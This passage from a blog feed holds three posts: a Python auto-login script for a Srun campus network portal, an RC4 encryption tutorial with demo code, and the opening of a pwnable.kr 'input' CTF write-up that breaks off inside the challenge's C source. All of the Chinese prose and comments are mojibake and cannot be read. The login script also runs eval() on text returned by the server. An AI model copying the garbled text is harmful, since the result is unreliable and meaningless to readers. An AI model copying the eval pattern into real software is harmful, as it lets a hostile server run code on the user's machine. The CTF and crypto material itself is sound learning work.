title="æ¨¡æ‹Ÿç™»å½•"></a>æ¨¡æ‹Ÿç™»å½•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> encryption.srun_md5 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_sha1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encryption.srun_xencode <span class="keyword">import</span> *</span><br><span class="line">header=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">init_url=<span class="string">&quot;http://10.110.74.91&quot;</span></span><br><span class="line">get_challenge_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/get_challenge&quot;</span></span><br><span class="line"></span><br><span class="line">srun_portal_api=<span class="string">&quot;http://10.110.74.91/cgi-bin/srun_portal&quot;</span></span><br><span class="line">n = <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">ac_id=<span class="string">&#x27;4&#x27;</span></span><br><span class="line">enc = <span class="string">&quot;srun_bx1&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chksum</span>():</span></span><br><span class="line">    chkstr = token+username</span><br><span class="line">    chkstr += token+hmd5</span><br><span class="line">    chkstr += token+ac_id</span><br><span class="line">    chkstr += token+ip</span><br><span class="line">    chkstr += token+n</span><br><span class="line">    chkstr += token+<span class="built_in">type</span></span><br><span class="line">    chkstr += token+i</span><br><span class="line">    <span class="keyword">return</span> chkstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span>():</span></span><br><span class="line">    info_temp=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:password,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line">        <span class="string">&quot;acid&quot;</span>:ac_id,</span><br><span class="line">        <span class="string">&quot;enc_ver&quot;</span>:enc</span><br><span class="line">    &#125;</span><br><span class="line">    i=re.sub(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="built_in">str</span>(info_temp))</span><br><span class="line">    i=re.sub(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_getip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    init_res=requests.get(init_url,headers=header)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;åˆå§‹åŒ–è·å–ip&quot;</span>)</span><br><span class="line">    <span class="comment">#print(init_res.text)</span></span><br><span class="line">    ip=re.search(<span class="string">&#x27;ip     : &quot;(.*?)&quot;&#x27;</span>,init_res.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ip:&quot;</span>,ip)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>():</span></span><br><span class="line">    <span class="comment"># print(&quot;è·å–token&quot;)</span></span><br><span class="line">    <span class="keyword">global</span> token</span><br><span class="line">    get_challenge_params=&#123;</span><br><span class="line">        <span class="string">&quot;callback&quot;</span>: <span class="string">&quot;jQuery112406608265734960486_&quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:username,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>:ip,</span><br><span class="line">        <span class="string">&quot;_&quot;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    get_challenge_res=requests.get(get_challenge_api,params=get_challenge_params,headers=header)</span><br><span class="line">    token=re.search(<span class="string">&#x27;&quot;challenge&quot;:&quot;(.*?)&quot;&#x27;</span>,get_challenge_res.text).group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(get_challenge_res.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tokenä¸º:&quot;</span>+token)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_complex_work</span>():</span></span><br><span class="line">    <span class="keyword">global</span> i,hmd5,chksum</span><br><span class="line">    i=get_info()</span><br><span class="line">    i=<span class="string">&quot;&#123;SRBX1&#125;&quot;</span>+get_base64(get_xencode(i,token))</span><br><span class="line">    hmd5=get_md5(password,token)</span><br><span class="line">    chksum=get_sha1(get_chksum())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ‰€æœ‰åŠ å¯†å·¥ä½œå·²å®Œæˆ&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    srun_portal_params=&#123;</span><br><span class="line">    <span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;jQuery11240645308969735664_&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)),</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:username,<span class="comment">#username,</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#123;MD5&#125;&#x27;</span>+hmd5,</span><br><span class="line">    <span class="string">&#x27;ac_id&#x27;</span>:ac_id,</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>:ip,</span><br><span class="line">    <span class="string">&#x27;chksum&#x27;</span>:chksum,</span><br><span class="line">    <span class="string">&#x27;info&#x27;</span>:i,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>:n,</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>:<span class="built_in">type</span>,</span><br><span class="line">    <span class="string">&#x27;os&#x27;</span>:<span class="string">&#x27;windows+10&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;windows&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;double_stack&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>:<span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(srun_portal_params)</span><br><span class="line">    srun_portal_res=requests.get(srun_portal_api,params=srun_portal_params,headers=header)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ok&#x27;</span> <span class="keyword">in</span> srun_portal_res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        error_msg=<span class="built_in">eval</span>(re.search(<span class="string">&#x27;\((.*?)\)&#x27;</span>,srun_portal_res.text).group(<span class="number">1</span>))</span><br><span class="line">        <span class="comment">#è¾“å‡ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error_type:&#x27;</span>+error_msg[<span class="string">&#x27;error&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(error_msg[<span class="string">&#x27;error_msg&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">global</span> username,password</span><br><span class="line">    username=<span class="string">&quot;&quot;</span><span class="comment">#ä½ çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæ³¨æ„åŠ ä¸Š@cmcc(ç§»åŠ¨) æˆ–è€…@chinanet(ç”µä¿¡)ï¼Œè”é€šæ˜¯å•¥å°±å¿˜äº†ã€‚ã€‚</span></span><br><span class="line">    password=<span class="string">&quot;&quot;</span></span><br><span class="line">    init_getip()</span><br><span class="line">    get_token()</span><br><span class="line">    do_complex_work()</span><br><span class="line">    login()</span><br></pre></td></tr></table></figure><p>æœ¬å­¦ç”Ÿæ¥è‡ªå˜‰å…´å­¦é™¢ï¼ŒåŒæ ¡æ ¡å‹å¯ä»¥æ¢ä¸Šè‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ç›´æ¥ç”¨ï¼Œå¦‚æœä¸æ˜¯çš„è¯æŠŠurlæ›¿æ¢ä¸€ä¸‹åº”è¯¥é—®é¢˜ä¹Ÿä¸å¤§ã€‚</p><p>ä»¥åä¸Šç½‘ç»ˆäºä¸ç”¨å†è¾“ç”¨æˆ·åå¯†ç äº†ï¼Œåªèƒ½è¯´çˆ½(ç‹—å¤´</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RC4åŠ å¯†çš„å­¦ä¹ </title>
      <link href="/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/27/RC4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æœ‰ç‚¹é¢“åºŸäº†ï¼Œæƒ³å­¦å†…æ ¸å¾ˆéš¾è¿›è¡Œï¼Œé€†å‘å…‰åˆ·é¢˜çœ‹ç€ä¹Ÿå¾ˆéš¾ï¼Œpwnåˆ·é¢˜å°±æ˜¯å¤„äºåˆ·çš„æ„Ÿè§‰ä¼¼æ›¾ç›¸è¯†ï¼Œæ²¡æœ‰ä¸€ç‚¹æå‡çš„æ„Ÿè§‰ï¼Œæ‰€ä»¥æˆ‘å†³å®šå…ˆæ”»ä¸€ä¸‹é€†å‘ï¼ŒæŠŠå¸¸è§åŠ è§£å¯†ç®—æ³•å…ˆå­¦äº†ï¼Œä»Šå¤©å…ˆæ¥è¿™ä¸ªRC4</p><span id="more"></span><h2 id="RC4åŠ å¯†"><a href="#RC4åŠ å¯†" class="headerlink" title="RC4åŠ å¯†"></a>RC4åŠ å¯†</h2><p>æˆ‘åˆè¯†RC4æ˜¯åœ¨å›½èµ›ï¼Œè®°å¾—å¾ˆæ¸…æ¥šçš„ä¸€ç‚¹å°±æ˜¯ä¸åœåœ°å–æ¨¡256ï¼Œé‚£é¢˜å½“æ—¶é ç€ç½‘ä¸Šèµ„æ–™å‹‰å¼ºç®—è¿‡å»äº†ã€‚ä½†æ˜¯è¿˜æ˜¯æƒ³ç³»ç»Ÿåœ°å­¦ä¸€ä¸‹ï¼Œç½‘ä¸Šæ•™ç¨‹åƒç¯‡ä¸€å¾‹ï¼Œæˆ‘å†³å®šè‡ªå·±æ¨¡æ‹Ÿä¸€è¾¹å®ƒçš„ç®—æ³•è¿‡ç¨‹ç„¶åå†ç†è§£ä¸€éã€‚</p><p>æ—¢ç„¶æ˜¯åŠ å¯†ï¼Œè„±ç¦»ä¸äº†ä¸‰ä¸ªæ¦‚å¿µï¼Œæ˜æ–‡ï¼Œå¯†æ–‡ï¼Œå¯†é’¥ã€‚RC4æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæˆ‘ä¹Ÿæ‰çŸ¥é“ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯ä¸å¯é€†çš„é‚£ç§hashåŠ å¯†ï¼Œæ‰€ä»¥æ—¢ç„¶å®ƒæ˜¯å¯¹ç§°åŠ å¯†ï¼Œé‚£ä¹ˆå¯¹äºåŠ å¯†å’Œè§£å¯†è¿‡ç¨‹ï¼Œä»–ä»¬æ‰€ç”¨çš„å¯†é’¥ç›¸åŒã€‚å®ƒç”Ÿæˆå¯†é’¥çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>ç”Ÿæˆå¯†é’¥éœ€è¦ä¸€ä¸ªé•¿åº¦ä¸å¤šäº256é•¿åº¦çš„å­—ç¬¦ä¸²ä½œä¸ºç§å­ç”Ÿæˆéšæœºå¯†é’¥ï¼Œè¿™æ˜¯æˆ‘è‡ªå·±çš„ç†è§£ï¼Œå› ä¸ºå®ƒç¡®å®ç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯è¿™æ ·çš„éšæœºã€‚å®ƒåˆå§‹ç”Ÿæˆäº†ä¸€ä¸ªé•¿åº¦ä¸º256çš„Sä¸²ï¼Œåˆå§‹S[i]=iï¼Œåé¢æ ¹æ®ç”¨å­—ç¬¦ä¸²ç§å­ä½œä¸ºä¸€ä¸ªå˜æ¢è§„åˆ™Tï¼Œäº¤æ¢Så¯†é’¥é‡Œçš„å„ä¸ªå€¼ï¼Œè¿™æ ·çš„äº¤æ¢å¥½å¤„åœ¨äºæˆ‘ä»¬å¯ä»¥ä¿è¯Sä¸²å¯†é’¥ä¸ºä¸€ä¸ªåŒå°„ï¼ˆæ»¡è¶³å•å°„å’Œæ»¡å°„ï¼Œè¿™ä¸ªæ¦‚å¿µé«˜ä¸­åº”è¯¥è®²è¿‡ï¼Œä¸èµ˜è¿°ï¼‰ã€‚ç„¶åç»™çš„ä¸€ä¸ªå­—ç¬¦ä¸²ç§å­å‘¢ï¼Œå°±ä¼šè¢«æ”¾è¿›Tä¸­ï¼ŒTçš„é•¿åº¦ä¹Ÿä¸º256ï¼Œå¦‚æœæ‰€ç»™å­—ç¬¦ä¸²ç§å­é•¿åº¦å°äº256ï¼Œåˆ™ä¼šè¿›è¡Œè½®æ¢ï¼Œç›´åˆ°å®ƒé•¿åº¦ä¸¥æ ¼ç­‰äº256ä¸ºæ­¢ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨RC4åŠ å¯†ä¸­ï¼Œå¦‚æœæˆ‘ç»™å®šå­—ç¬¦ä¸²ç§å­ä¸ºabcdï¼Œé‚£ä¹ˆTçš„å€¼å°†æ˜¯[â€˜aâ€™,â€™bâ€™,â€™câ€™,â€™dâ€™,â€™aâ€™,â€™bâ€™,â€™câ€™,â€™dâ€™,â€™aâ€™,â€™bâ€™,â€™câ€™,â€™dâ€™,â€¦â€¦â€™aâ€™,â€™bâ€™,â€™câ€™,â€™dâ€™]ï¼Œå¯¹äºä»»æ„0&lt;=i&lt;256ï¼Œ</p><p>T[i]=Seed[i%len(Seed)]</p><p>é‚£ä¹ˆæœ‰äº†è¿™ä¸ªTä¹‹åå‘¢ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹è¿›è¡Œå¯†é’¥å˜æ¢äº†ï¼Œåšä»¥ä¸‹è§„åˆ™çš„å˜æ¢(å­—ç¬¦ä¸²å‡è½¬æˆASCIIç è®¡ç®—)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+T[i])%<span class="number">256</span></span><br><span class="line">    swap(S[i],S[j])</span><br></pre></td></tr></table></figure><p>ä»è¿™ä¸€æ­¥æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼ŒSåˆå€¼æˆ‘ä»¬éƒ½æ˜¯çŸ¥é“çš„ï¼ŒTåœ¨ç¡®å®šäº†å­—ç¬¦ä¸²ç§å­ä¹‹åä¹Ÿæ˜¯ç¡®å®šçš„ï¼Œé‚£ä¹ˆç”±æ­¤å¯ä»¥ç®—å‡ºå¯†é’¥Sã€‚æˆ‘ä»¬å¹³æ—¶ä¹ æƒ¯è¯´é‚£ä¸ªå­—ç¬¦ä¸²æ˜¯å¯†é’¥ï¼Œä½†æ˜¯ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œå­—ç¬¦ä¸²åªæ˜¯ç”¨æ¥ç¡®å®šå¯†é’¥çš„ï¼Œå› ä¸ºåœ¨è¿™ä¹‹åï¼ŒTå’Œç»™çš„å­—ç¬¦ä¸²å·²ç»éƒ½ç”¨ä¸åˆ°äº†ã€‚æ‰€ä»¥è¿™ä¹Ÿæ˜¯æˆ‘ä¸ºä»€ä¹ˆè¯´é‚£ä¸ªå­—ç¬¦ä¸²æ˜¯ç§å­è€Œä¸æ˜¯å¯†é’¥ï¼Œå› ä¸ºå®ƒæ²¡æœ‰å‚ä¸åŠ å¯†çš„è¿ç®—ï¼Œæˆ‘ä»¬åˆšåˆšç®—çš„é‚£ä¹ˆå¿«ä¹å‹æ ¹éƒ½æ²¡æœ‰å‡ºç°æ˜æ–‡è¿™ç§ï¼Œæ²¡æœ‰æ˜æ–‡æ€ä¹ˆèƒ½ç®—åŠ å¯†å‘¢å¯¹å§ã€‚</p><p>æœ€åæˆ‘ä»¬çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•åŠ å¯†çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    c[k]=m[k]^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>æœ‰æœ¨æœ‰æ„Ÿè§‰å¾ˆç†Ÿæ‚‰ï¼Œè·Ÿå‰é¢ç”Ÿæˆå¯†é’¥çš„ç®—æ³•å·®ä¸å¤šã€‚è¿™ä¸ªç®—æ³•å¦‚æœä¸äº†è§£RC4ï¼Œç›´æ¥é€†ä¸Šå»çš„è¯ï¼Œæ€•èƒ½ç›´æ¥ç ´é˜²ã€‚æˆ‘æœ‰ä½“ä¼šæˆ‘ç»™ä½ ä»¬æ¼”ç¤ºä¸€éï¼Œé¦–å…ˆiåˆå€¼çŸ¥é“ï¼Œc[k]çŸ¥é“ï¼Œç„¶åè¦ç®—æ˜æ–‡çš„è¯m[k]=c[k]^S[(S[i]+S[j])%256]ç„¶åå‘¢ï¼Œiæœ€ç»ˆå€¼ä¸çŸ¥é“ï¼Œjæœ€ç»ˆå€¼ä¸çŸ¥é“ï¼Œå°±ï¼Œæ—¶é—´é™æ­¢äº†å‘—ã€‚ä½†æ˜¯å…¶å®å®ƒæœ€åå°±åšä¸€ä¸ªå¼‚æˆ–ï¼Œå°±ä¸ç”¨ç®¡å®ƒäº†å‘—ï¼Œè·Ÿå®ƒä¸€æ ·ä»å¤´å¾€åå†å¼‚æˆ–ä¸€éï¼Œä¸å°±å›æ¥äº†å—ã€‚è¿™ä¹Ÿå°±æ˜¯å®ƒä¸ºä»€ä¹ˆä¹Ÿå«å¯¹ç§°åŠ å¯†ï¼Œå®ƒä¸ä»…å¯†é’¥ç”¨çš„æ˜¯ä¸€ä¸ªï¼ŒåŠ å¯†è§£å¯†ç®—æ³•éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ²¡é”™ï¼ŒåŠ å¯†å³è§£å¯†ã€‚RC4è§£å¯†åªéœ€è¦å¯¹å¯†æ–‡å†åŠ å¯†ä¸€æ¬¡å°±å¯ä»¥å¾—åˆ°æ˜æ–‡äº†ã€‚</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">m=<span class="string">&#x27;I love xia0ji233&#x27;</span></span><br><span class="line">S=[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">key=<span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line">T=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> S:</span><br><span class="line">    T.append(key[i%<span class="built_in">len</span>(key)])</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j=(j+S[i]+<span class="built_in">ord</span>(T[i]))%<span class="number">256</span></span><br><span class="line">    t=S[i]</span><br><span class="line">    S[i]=S[j]</span><br><span class="line">    S[j]=t</span><br><span class="line"></span><br><span class="line">i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    j=(j+S[i])%<span class="number">256</span></span><br><span class="line">    t=<span class="built_in">ord</span>(m[k])^S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(t)[<span class="number">2</span>:],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#2ef1bae658e6e938ca2af63e95e372d</span></span><br></pre></td></tr></table></figure><p>æŠŠå®ƒæ”¾åˆ°CyberChefä¸­åŠ å¯†å‘ç°ç»“æœä¸€è‡´ï¼Œæœ¬æ¬¡å¯èƒ½è¯´å°±æ˜¯å­¦äº†ä¸ªå¯‚å¯å§ï¼Œå› ä¸ºæˆ‘æœ€ååªè¦çŸ¥é“å®ƒåŠ å¯†è§£å¯†ç®—æ³•ä¸€è‡´è¿™ä¸ªç»“è®ºå°±å¯ä»¥äº†ã€‚ä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯å­¦ä¼šäº†å¦‚ä½•åˆ†è¾¨è¿™æ ·çš„åŠ è§£å¯†ä»¥åŠå®ƒåŠ è§£å¯†çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä¹Ÿç®—å°æœ‰æˆå°±å§ï¼Œç¬é—´ä¸emoäº†å“ˆå“ˆå“ˆå“ˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable input writeup</title>
      <link href="/2021/11/23/pwnable_input/"/>
      <url>/2021/11/23/pwnable_input/</url>
      
        <content type="html"><![CDATA[<p>çœŸçš„æ¨èå­¦linux Cçš„IOä¸€å®šå¾—åšåšè¿™ä¸ªï¼ŒçœŸçš„èƒ½å­¦åˆ°å¾ˆå¤šã€‚</p><span id="more"></span><p>è¿æ¥è¿œç¨‹æœåŠ¡å™¨æŠŠæºç ä¸‹ä¸‹æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span 